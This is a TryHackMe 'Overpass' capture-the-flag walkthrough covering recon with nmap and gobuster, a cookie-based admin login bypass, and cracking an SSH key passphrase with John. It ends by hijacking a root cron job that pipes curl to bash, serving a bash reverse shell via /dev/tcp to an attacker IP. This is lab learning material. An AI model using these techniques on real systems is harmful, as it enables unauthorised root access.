Overpass CTF
=================

## This is a CTF on [Try hack me](https://tryhackme.com)

# Recon

## Nmap

~~~
sudo nmap -sS -sV 10.10.254.65 -Pn -v
[sudo] password for sloppy: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-31 22:16 GMT
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 22:16
Completed Parallel DNS resolution of 1 host. at 22:16, 0.01s elapsed
Initiating SYN Stealth Scan at 22:16
Scanning 10.10.254.65 [1000 ports]
Discovered open port 80/tcp on 10.10.254.65
Discovered open port 22/tcp on 10.10.254.65
Completed SYN Stealth Scan at 22:16, 0.39s elapsed (1000 total ports)
Initiating Service scan at 22:16
Scanning 2 services on 10.10.254.65
Completed Service scan at 22:17, 11.20s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.254.65.
Initiating NSE at 22:17
Completed NSE at 22:17, 0.09s elapsed
Initiating NSE at 22:17
Completed NSE at 22:17, 0.06s elapsed
Nmap scan report for 10.10.254.65
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
           Raw packets sent: 1000 (44.000KB) | Rcvd: 1000 (40.008KB)
~~~

## Gobuster

~~~
gobuster dir -u http://10.10.254.65 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt      
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.254.65
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/31 22:22:11 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]
/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]
/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
/http%3A%2F%2Fcommunity (Status: 301) [Size: 0] [--> /http:/community]
/http%3A%2F%2Fradar   (Status: 301) [Size: 0] [--> /http:/radar]
/http%3A%2F%2Fjeremiahgrossman (Status: 301) [Size: 0] [--> /http:/jeremiahgrossman]
/http%3A%2F%2Fweblog  (Status: 301) [Size: 0] [--> /http:/weblog]
/http%3A%2F%2Fswik    (Status: 301) [Size: 0] [--> /http:/swik]
Progress: 220496 / 220561 (99.97%)===============================================================
2022/10/31 22:28:20 Finished
===================================
~~~

## http (80)

~~~
Some manual Enumeration for names etc

Ninja - Lead Developer

Pars - Shibe Enthusiast and Emotional Support Animal Manager

Szymex - Head Of Security

Bee - Chief Drinking Water Coordinator

MuirlandOracle - Cryptography Consultant
~~~

## /admin (from go buster)

~~~
upon enumeration cookies flaw lets us in with broken access control by bypass login with setting the cookie

Cookies.set("SessionToken", 'myCookieValue')

we find a RSA private key for James so we save it on 

id_rsa

chmod 600 id_rsa (make it our own)

try login via ssh

ssh -i id_rsa james@ip

Requires a phassphrase!

so we use john to crack
~~~

## John the ripper

~~~
sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
[sudo] password for sloppy: 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (id_rsa)     
1g 0:00:00:00 DONE (2022-10-31 23:58) 50.00g/s 668800p/s 668800c/s 668800C/s 120806..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

## SSH and Priv Esc

~~~
We found a crontab that runs on 

james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

Lets go to /etc/hosts

change overpass.thm to our attacker IP address

On our pc we make a path dir

mkdir -p /downloads/scr/

and make a buildscript.sh with

bash -c "bash -i >& /dev/tcp/10.8.12.24/1337 0>&1"
~~~

# http server and Listener (root)

~~~
run a http webserver for the box to grab the file youve created but make sure to specifiy the port

sudo python -m http.server 80

sudo nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.12.24] from (UNKNOWN) [10.10.227.107] 41588
bash: cannot set terminal process group (1085): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# whoami
whoami
root
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{awnser}
root@overpass-prod:~# 
~~~

# Conclusion

~~~
I learnt alot on this box, although rated easy it was new techinics for me so took longer than expected.
~~~
